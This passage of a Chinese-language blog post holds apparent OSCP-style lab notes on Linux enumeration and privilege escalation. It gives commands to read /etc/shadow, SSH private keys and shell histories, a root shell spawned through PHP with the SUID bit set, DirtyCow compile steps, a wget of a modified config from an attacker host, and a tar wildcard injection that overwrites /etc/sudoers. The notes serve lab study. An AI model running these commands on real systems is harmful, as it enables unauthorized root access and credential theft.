class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前用户是谁，谁登录过当前主机，主机上有哪些用户，谁有sudo权限？</span></span><br><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd | cut -d: -f1    # List of users</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#x27;$3 == 0 &#123; print $1&#125;&#x27;   # List of super users</span><br><span class="line">awk -F: &#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27; /etc/passwd   # List of super users</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常见敏感文件</span></span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">home目录下文件</span></span><br><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认配置下的密码文件所在路径</span></span><br><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户的历史记录里有没有密码？</span></span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">else</span></span></span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.profile</span><br><span class="line">cat /var/mail/root</span><br><span class="line">cat /var/spool/mail/root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">公钥和私钥信息</span></span><br><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure><h3 id="文件系统信息收集"><a href="#文件系统信息收集" class="headerlink" title="文件系统信息收集"></a>文件系统信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/中可以写入哪些配置文件？能够重新配置服务吗？</span></span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.*w.*/&#x27; 2&gt;/dev/null     # Anyone</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^..w/&#x27; 2&gt;/dev/null       # Owner</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /^.....w/&#x27; 2&gt;/dev/null    # Group</span><br><span class="line">ls -aRl /etc/ | awk &#x27;$1 ~ /w.$/&#x27; 2&gt;/dev/null        # Other</span><br><span class="line"></span><br><span class="line">find /etc/ -readable -type f 2&gt;/dev/null               # Anyone</span><br><span class="line">find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null   # Anyone</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/var/目录下常见敏感路径</span></span><br><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat /var/lib/dhcp3/dhclient.leases</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网站上有任何配置文件隐藏吗？ 是否有包含数据库信息的配置文件？</span></span><br><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">日志文件中是否有任何内容（可以和文件包含漏洞结合）</span></span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br><span class="line"></span><br><span class="line">Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">是否有未挂载的文件系统？</span></span><br><span class="line">cat /etc/fstab</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用了“Advanced Linux File Permissions”吗？ 比如SUID和GUID</span></span><br><span class="line">find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span><br><span class="line"></span><br><span class="line">find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID</span><br><span class="line">for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#x27;common&#x27; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span></span><br><span class="line">find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \; 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">哪里可以写入或者执行？常见的有/tmp、/var/tmp、/dev/shm</span></span><br><span class="line">find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span><br><span class="line"></span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span><br><span class="line"></span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找nobody文件</span></span><br><span class="line">find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files</span><br><span class="line">find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files</span><br></pre></td></tr></table></figure><h3 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装了哪些开发工具？</span></span><br><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">怎么把文件传上去？</span></span><br><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure><h2 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h2><h3 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h3><p>1.运行sudo -l，查看sudo权限的命令</p><p>2.查找suid权限文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>3.查找具有cap权限的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>4.查找内核</p><p>5.利用lxd&#x2F;lxc提权，执行id的时候发现用户属于lxd组</p><p>6.查看当前目录下有没有.history之类的文件，有的话，试一下密码重用能不能打</p><h3 id="其他的方法或者注意事项"><a href="#其他的方法或者注意事项" class="headerlink" title="其他的方法或者注意事项"></a>其他的方法或者注意事项</h3><h4 id="php的suid提权"><a href="#php的suid提权" class="headerlink" title="php的suid提权"></a>php的suid提权</h4><p>php的suid提权，假设发现了&#x2F;usr&#x2F;bin&#x2F;php7.2文件，直接运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/php7.2 -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><p>如果不成功，运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php7.2 -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r “pcntl_exec(‘/bin/sh’, [‘-p’]);”</span><br></pre></td></tr></table></figure><h4 id="DirtyCow提权"><a href="#DirtyCow提权" class="headerlink" title="DirtyCow提权"></a>DirtyCow提权</h4><p>脏牛提权4.4.0-31-generic，exp位于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/exploitdb/exploits/linux/local/40847.cpp</span><br></pre></td></tr></table></figure><p>将CPP下载到目标主机，然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow -s</span><br></pre></td></tr></table></figure><p>一定要先转成交互式shell再执行，不然失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>第二个脏牛的exp</p><p><a href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a></p><p>一定要在目标机器上编译运行</p><p>有的是C语言，gcc编译，有的是cpp，g++编译</p><h4 id="getcap提权"><a href="#getcap提权" class="headerlink" title="getcap提权"></a>getcap提权</h4><p>getcap返回tar命令的提权方法（&#x2F;home目录下有tar文件）<br>举个例子，getcap返回的是&#x2F;home&#x2F;cyber&#x2F;tar cap_dac_read_search&#x3D;ep，意味着&#x2F;home&#x2F;cyber&#x2F;tar有cap权限，那么就可以执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./tar -cvf shadow.tar /etc/shadow</span><br><span class="line">./tar -xvf shadow.tar</span><br></pre></td></tr></table></figure><p>.&#x2F;意思是用当前目录下的tar文件，不加.&#x2F;意思就是用系统的tar，因为题目给的tar文件有执行权限，所以要用题目给的tar打包,再查看解压的文件，这里是查看shadow文件，想查看哪个目录就把哪个目录下的文件打包再解压就行了</p><h4 id="apache配置文件提权"><a href="#apache配置文件提权" class="headerlink" title="apache配置文件提权"></a>apache配置文件提权</h4><p>运行sudo -l，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl start apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl stop apache2</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后找到apache的配置文件, 当前用户www-data对apache2.conf有修改权限</p><p>apche2.conf文件中的如下配置是设置apache是以什么用户的权限运行起来的，也就是说，如果是以root权限起的apache，那么反弹的shell就是root权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User $&#123;APACHE_RUN_USER&#125;</span><br><span class="line">Group $&#123;APACHE_RUN_GROUP&#125;</span><br></pre></td></tr></table></figure><p>假设可以改成mahakal（也可以试一下root）</p><p>靶机上进入&#x2F;tmp目录，从攻击机下载修改后的apache2.conf，并复制到&#x2F;etc&#x2F;apache2&#x2F;apache2.conf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@ubuntu:/tmp$ wget http://192.168.101.34/apache2.conf</span><br><span class="line">www-data@ubuntu:/tmp$ cp /tmp/apache2.conf /etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># These need to be set in /etc/apache2/envvars</span><br><span class="line">User mahakal</span><br><span class="line">Group mahakal</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/systemctl restart apache2</span><br></pre></td></tr></table></figure><p>然后重新反弹shell，拿到mahakal权限</p><h4 id="其他的方法"><a href="#其他的方法" class="headerlink" title="其他的方法"></a>其他的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1.</span><br><span class="line">看/home目录，有么有别的用户，如果有，看文件，如果没文件，看.ssh目录下的authorized_keys文件有没有公钥信息，比如当前a用户登录的系统，b用户下的.ssh目录中有a用户的公钥信息，如下</span><br><span class="line">ssh-rsa AAAAB3xxxXEB9F3 a@debian</span><br><span class="line">意味着a可以直接运行ssh b@127.0.0.1切换到b用户</span><br><span class="line"></span><br><span class="line">2.记得是运行ls -al查看所有用户，如果sudo的权限没有对应文件，记得看一下是不是可以创建对应的文件，比如</span><br><span class="line">查看seppuku的sudo权限没有找到利用方法，换个账户登ssh，查看/home目录发现tanto用户，也没有可利用的，在seppuku的目录下发现.passwd文件，里面是12345685213456!@!@A，猜测可以用这个登录最后一个用户samurai，发现可以执行</span><br><span class="line">(ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br><span class="line">但是/home/tanto/下没有.cgi_bin目录，我们创建一个（切换到tanto用户去创建）</span><br><span class="line">```</span><br><span class="line">mkdir .cgi_bin</span><br><span class="line">cd .cgi_bin/</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; bin</span><br><span class="line">chmod 777 bin #这里一定要改权限，不然samurai无权执行</span><br><span class="line">```</span><br><span class="line">然后切换到tanto用户，执行</span><br><span class="line">```</span><br><span class="line">sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</span><br><span class="line">```</span><br><span class="line">拿到root</span><br><span class="line"></span><br><span class="line">3.使用pypy去查看进程</span><br><span class="line"></span><br><span class="line">4.get cap的命令去查了之后要分析怎么跑，不要直接套用</span><br><span class="line"></span><br><span class="line">5.计划任务提权可以通过搜当前用户有写权限的所有文件来试试</span><br><span class="line">find / -type f -perm /o+w | grep &quot;.sh&quot;</span><br><span class="line">find / -type f -user $(whoami) -perm /u+w</span><br><span class="line"></span><br><span class="line">6.CVE-2024-1086</span><br></pre></td></tr></table></figure><h2 id="使用tar命令进行提权"><a href="#使用tar命令进行提权" class="headerlink" title="使用tar命令进行提权"></a>使用tar命令进行提权</h2><p>这里只举例使用root权限运行计划任务，且使用了通配符的tar的bash脚本compressToBackup.sh，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">cd /home/kali/Desktop/TarWildCardPrivEsc/</span><br><span class="line">tar -zcf /home/kali/Desktop/TarWildCardPrivEsc/backup.tgz *</span><br></pre></td></tr></table></figure><p>看起来只是执行了cd命令把工作目录切换到&#x2F;home&#x2F;…&#x2F;TarWildCardPrivEsc，然后执行tar 命令把TarWildCardPrivEsc目录下所有的内容打包到backup.tgz文件</p><p>这里当使用了通配符*时，bash interpreter其实是这样解释的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /home/.../TarWildCardPrivEsc/backup.tgz image.png randomfile.txt ... 31337h4ck3r8.zip</span><br></pre></td></tr></table></figure><p>*通配符会被目录下所有的文件名替代，作为攻击者，我们可以利用这一点，创建特定的文件名，这些文件名将被解释为tar的标志，而不是实际的文件。</p><p>使用<code>— checkpoint-action</code>可以在执行tar之后执行命令，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /home/backup.tgz toBeBackedUp --checkpoint=1 --checkpoint-action=exec=whoami</span><br></pre></td></tr></table></figure><p>最后的exploit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 1. 在被打包的文件目录下生成两个文件</span><br><span class="line"># &#x27;--checkpoint=1&#x27; and &#x27;--checkpoint-action=exec=sh privesc.sh&#x27;</span><br><span class="line"></span><br><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint=1&#x27;</span><br><span class="line">echo &quot;&quot; &gt; &#x27;--checkpoint-action=exec=sh privesc.sh&#x27;</span><br><span class="line"></span><br><span class="line"># 2. 再创建一个privesc.sh，内容如下，这里的kali需要换成当前低权限用户的name</span><br><span class="line">echo &#x27;kali ALL=(root) NOPASSWD: ALL&#x27; &gt; /etc/sudoers</span><br><span class="line"></span><br><span class="line">#The above injects an entry into the /etc/sudoers file that allows the &#x27;kali&#x27; </span><br><span class="line">#user to use sudo without a password for all commands</span><br><span class="line">#NOTE: we could have also used a reverse shell, this would work the same!</span><br><span class="line">#OR: Even more creative, you could&#x27;ve used chmod to changes the permissions</span><br><span class="line">#on a binary to have SUID permissions, and PE that way</span><br></pre></td></tr></table></figure><p>再等一会，当前用户就有sudo权限了</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>筛选具有登录权限的账号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd l grep sh$</span><br></pre></td></tr></table></figure><p>使用ls -la查看用户目录的所有文件，重点看一下.zsh_history</p><p>查看当前目录中所有文件里有没有包含关键字pass的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -Ri pass .</span><br></pre></td></tr></table></figure><p>查看hostname主机名的意义在于，在企业环境下，很多主机的主机名的命名都是和主机的功能密切相关的</p><p>收集主机发行版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">  cat /etc/lsb-release      # Debian based</span><br><span class="line">  cat /etc/redhat-release   # Redhat based</span><br><span class="line">cat /etc/os-release</span><br><span class="line">lsb_release -a</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><p>然后searchspoit去搜索exp，内核版本4.x或者5.x很有可能可以通过内核提权，但是考试的时候可能会故意把内核版本做低，把依赖库删掉</p><p>查看系统当前进程，重点关注有没有以root运行的进程或者服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef</span><br></pre></td></tr></table></figure><p>查看网卡、路由信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ip route</span><br><span class="line">route</span><br><span class="line">ss -pantu #查看主机和其他主机是否有连接</span><br></pre></td></tr></table></figure><p>查看防火墙规则（不一定有权限访问），如有权限，可能影响反弹shell的时候的端口选择</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/iptables/rules.xxx</span><br></pre></td></tr></table></figure><p>查看计划任务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron_xxxxx</span><br><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p>使用rsg生成反弹shell的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsg $IP $port 语言框架(nc\powershell\bash\不设置该参数默认生成所有的)</span><br></pre></td></tr></table></figure><p>查看系统安装了哪些软件包，以ii开头的就是已经安装的，可以搜索有无已知漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l</span><br></pre></td></tr></table></figure><p>查看文件系统权限命令，可以在<a href="https://gtfobins.github.io下找提权方法/">https://gtfobins.github.io下找提权方法</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查找属于root用户的且当前用户可写的，可执行的文件，-u=x表示至少有执行权限，u=x表示只有执行权限</span></span><br><span class="line">find / --witeable -type f -user root -perm -u=x 2&gt;/dev/null</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span 